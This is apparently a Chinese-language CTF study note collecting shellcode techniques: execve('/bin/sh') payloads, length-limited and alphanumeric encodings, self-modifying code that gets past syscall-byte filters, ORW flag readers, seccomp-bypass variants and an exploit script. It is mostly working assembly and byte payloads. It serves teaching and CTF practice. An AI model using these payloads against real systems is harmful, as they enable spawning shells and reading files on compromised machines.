# shellcode

其实想要做的是代码注入总结篇

## 基础shellcode的书写

要做shellcode，认为有下面几点要解决：

- 一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有`mprotect`函数或者`mmap`函数，可以对指定内存区域申请权限
- 需要知道写入地址，或者让寄存器指向写入的代码块

### 直接pwntools生成

```assembly
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

这里将`/bin/sh`直接压入栈中，然后利用rsp的偏移获取地址，直接生成`shellcraft.sh()`生成即可，不做过多介绍

### 限制长度的shellcode（x86)

```assembly
xor rsi,rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop	 rdi
mov  al, 59
cdq
syscall
```

总长度为22（0x16)字节，实现的是`execve('/bin/sh',{'sh'},0)`，构造出来的条件是这样的：

- rax:0x3b
- rdi:’/bin/sh’
- rsi:’sh’
- rdx:NULL

但是注意，需要eax的高二位为0(一般没什么问题)

bytes形式：

```assembly
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

可见字符形式(AE64生成)：

*关于ae64,直接看[这里](https://github.com/veritas501/ae64)就可以*

```assembly
WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP
```

**当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）**

> 例如tgctf2025的shellcode，[这里](https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/tgctf/wp.md)

### 字符限制shellcode

一般会出现过滤掉某些特定字符，这时候可以用**自改变shellcode**或者**某些纯字母的shellcode**

纯字母（这里用的是[V3rdant的shellcode](https://v3rdant.cn/Pwn.Stack-Overflow-Overview/#shellcode%E7%9A%84%E4%B9%A6%E5%86%99)）

```assembly
// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129
/* from call rax */
push rax
push rax
pop rcx

/* XOR pop rsi, pop rdi, syscall */
push 0x41413030
pop rax
xor DWORD PTR [rcx+0x30], eax

/* XOR /bin/sh */
push 0x34303041
pop rax
xor DWORD PTR [rcx+0x34], eax
push 0x41303041
pop rax
xor DWORD PTR [rcx+0x38], eax

/* rdi = &'/bin/sh' */
push rcx
pop rax
xor al, 0x34
push rax

/* rdx = 0 */
push 0x30
pop rax
xor al, 0x30
push rax
pop rdx

push rax

/* rax = 59 (SYS_execve) */
push 0x41
pop rax
xor al, 0x7a

/* pop rsi, pop rdi*/
/* syscall */ 
.byte 0x6e
.byte 0x6f
.byte 0x4e
.byte 0x44

/* /bin/sh */
.byte 0x6e
.byte 0x52
.byte 0x59
.byte 0x5a
.byte 0x6e
.byte 0x43
.byte 0x5a
.byte 0x41
```

这一段shellcode可以绕过`\x05\x0f`的过滤，但是注意这里需要由`call rax`启动

**自改变shellcode**（这里用的whuctf2025中shell_for_shell）

```assembly
	mov si, word ptr [r15 + 0x100]	;r15的值+0x100，赋给si（rsi，16位模式)
    add si, 0x101					;再将si加上0x101
    mov word ptr [r15 + 0x100], si	;修改后的si存给r15+0x100的内存位置
    /*这里是为了给后面syscall找个确定位置，顺便自加一*/
    push 0x68						;压入"h"
    mov rax, 0x732f2f2f6e69622f		;压入/bin///s到rax中
    push rax						;压入rax中的值
    mov rdi, rsp					;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve

    push 0x1010101 ^ 0x6873			;异或的值压栈，避免显式空字节
    xor dword ptr [rsp], 0x1010101	;异或解密栈顶4字节，得到'sh\x00'
    xor esi, esi /* 0 */
    push rsi 						;作为字符串的\x00
    push 8							;压入8，后面计算‘sh\x00'字符串地址用
    pop rsi							;将8弹给rsi
    add rsi, rsp					;rsi=8+rsp，指向'sh\x00'
    push rsi 						;压入sh\x00
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve 				;等价于push 0x3b
    pop rax							;弹给rax
```

注入时

```python
payload = (b"\x00\xc0"+asm(shellcode)).ljust(0x100-3, b"\x90")+b"\x0e\x04"
```

详细解释见[这里的自改变shellcode](https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/whuctf2025/wp.md)

### orw

**自动生成**

pwntool里有自己的orw生成，但是字节比较长，一般情况下都不太合适,仅作参考

这里是buuctf第45题pwnable_orw题解中摘取的

```python
bss = 0x804A060
shellcode = shellcraft.open('flag')
shellcode+=shellcraft.read('eax',bss+100,100)
shellcode+=shellcraft.write(1,bss+100,100)
payload = asm(shellcode)
```

长度为0x36字节

**短字节**

所以这里一般使用另一种总计0x28字节，要求:

- rsp指向的地址必须可用
- 存在NULL字符（不存在\x00导致截断）
- 不可指定地址

```assembly
// rdx为写入数量
mov rdx, 0x200
push 0x67616c66
mov rdi,rsp
xor esi,esi  #如果本来rsi=0，可以删掉这句
mov eax,2
syscall
mov edi,eax
mov rsi,rsp
xor eax,eax
syscall
xor edi,2  
mov eax,edi
syscall  
```

bytes:

```assembly
\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05
```

**可指定地址**

```python
shellcode = """
xor rdx,rdx
mov dh, 0x2
mov rdi,{}
xor esi,esi  
mov eax,2
syscall
mov rsi,rdi
mov edi,eax
xor eax,eax
syscall
xor edi,2
mov eax,edi
syscall
""".format(hex(target_addr + 0xb0))
```

长度比0x90大

## 书写更短的shellcode

前面在基础shellcode的书写中已经说过很多了，这里主要提几个tip

### 使用残留寄存器

依旧是用tgctf2025的shellcode举例，动调发现寄存器除了rdi外全部清空，且限制0x12字节

但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode

```python
shellcode = asm('''
mov rdi,0xa
add rax,0x3b
syscall
''')
payload = shellcode+b'/bin/sh\x00'
```

### 特殊指令的使用

- cwd系列:

  - `CWD`: `AX`符号位拓展到`DX`

  - `CDQ`: `EAX`符号位拓展到`EDX`⭐
  - `CQO`：`RAX`符号位拓展到`RDX`
  - `CBW`: `AL`符号位拓展到`DX`

### 寄存器复用

## 书写受限制的shellcode

### 字符限制

一般是**坏字符（\x00)**,**syscall过滤（\x05\x0f)**,**可见字符**

可见字符前面已经说过了，利用alpha3和ae64进行编码，这边优劣如下

|                               | ae64 | [alpha3](https://github.com/SkyLined/alpha3) |
| ----------------------------- | ---- | -------------------------------------------- |
| x32位编码为可见字符           | ❌    | ✔                                            |
| x64位编码位可见字符           | ✔    | ✔                                            |
| 原shellcode是否可以包含零字节 | ✔    | ❌                                            |
| 基址寄存器是否可以包含偏移量  | ✔    | ❌                                            |

**syscall过滤**

其中一种方法上面已经介绍过了，使用自改变shellcode。如果可操作空间够大的话，还可以尝试read重新读入shellcode

具体过程就是：布置栈帧，调用read->利用read将shellcode读入指定地点->实现getshell

依旧用whuctf2025的shell_for_shell举例，这里可见powchan的exp:

```python
shellcode = """
	mov rbp, 0x404500
    mov rsp, rbp
    lea r15, [rip+0xe00]
    sub r15, 0xe16
    mov rdi, r15
    mov rsi, 0x1000
    mov rdx, 0x7
    mov rax, 0x401070
    call rax
    mov rsi, r15
    add rsi, 0x86
    mov rdi, 0
    mov rdx, 0x100
    mov rax, 0x401050
    call rax
    /* push syscall number */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    
"""
payload = b"\x00\xc0"+asm(shellcode)
print(payload)
io.send(payload)
pause()
io.send(asm("syscall"))
io.interactive()
```

**坏字符**

坏字符过滤的话可以直接去[这里](https://shell-storm.org/shellcode/index.html)找不含\x00的shellcode

注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\x00’就结束了，所以我们需要特定的shellcode

```assembly
xor ecx, ecx
mul ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov al, 11
int 0x80
```

```assembly
xor    rsi, rsi
push   rsi
mov    rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rdi
mov    al, 0x3b
cdq    
syscall
```

共22字节数（其实和上面最短shellcode一样的）

```python
b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
```

```python
b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
```

### 特定位置限制

这里有几个思路

- 利用read函数再次读入，且将读入地址写为合适地址，这种适合给定的shellcode长度比较短

  `ssize_t read(int fd, void *buf, size_t count)`

  | 参数  | 对应寄存器 | 作用                      |
  | ----- | ---------- | ------------------------- |
  | fd    | rdi        | 0表示从用户输入的值中读取 |
  | buf   | rsi        | 输入到的地址              |
  | count | rdx        | 输入的长度                |

- 利用mprotect重新为特定地址申请权限

  `int mprotect(void *addr, size_t len, int prot)`

  | 参数 | 对应寄存器 | 作用                  |
  | ---- | ---------- | --------------------- |
  | addr | rdi        | 内存起始地址          |
  | len  | rsi        | 处理的长度            |
  | proc | rdx        | 保护（1为r,2为w,4为x) |

- 利用mmap类函数申请开辟特定权限的空间

  `void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)`

  | 参数   | 对应寄存器 | 作用                               |
  | ------ | ---------- | ---------------------------------- |
  | start  | rdi        | 开始地址，0表示系统指定            |
  | length | rsi        | 映射区长度，不足一页按照一页来处理 |
  | prot   | rdx        | 保护标志，同上                     |
  | flags  | r10        | 映射对象的类型，一般设置22         |
  | fd     | r8         | 文件描述符，设置-1就可以           |
  | offset | r9         | 被映射对象内容的起点               |

## seccomp绕过

#### level1 开放open,read,write

```assembly
push   0x67616c66
mov    rdi, rsp
xor    esi, esi
push   0x2
pop    rax
syscall 
mov    rdi, rax
mov    rsi, rsp
mov    edx, 0x100
xor    eax, eax
syscall 
mov    edi, 0x1
mov    rsi, rsp
push   0x1
pop    rax
syscall
```

#### level2 关闭open

```assembly
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
mov r10,0x100 # 读取文件的长度,不够就加
mov rax,40
syscall
```

```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
```

#### level3 openat readv writev

```assembly
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
mov rdi,rax
push 0x100 # 读入大小由这个控制
mov rbx,rsp
sub rbx,0x108 # 为读入大小加8
push rbx
mov rsi,rsp
mov rdx,1
mov rax,19
syscall
mov rdi,1
mov rsi,rsp
mov rdx,1
mov rax,20
syscall
```

```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05'
```

#### level3.5 openat2 read write

```assembly
mov rax, 0x67616c66 # 路径
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

```python
b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
```

## Tips

- 有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\x00起手的指令，绕过判断
- 在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址

  - 在32位程序中，还可以通过call指令获取将运行地址压入栈中
  - 在64位地址中，可以直接通过 `lea rax, [rip]` 来获取rip地址

- 有些时候如果开启了PIE、ASLR保护，地址未知，可以尝试泄露fs寄存器中的值，可以见[这篇](https://powchan.github.io/2025/03/31/WHUCTF2025-pwn-wp/#shell-for-another-shell)

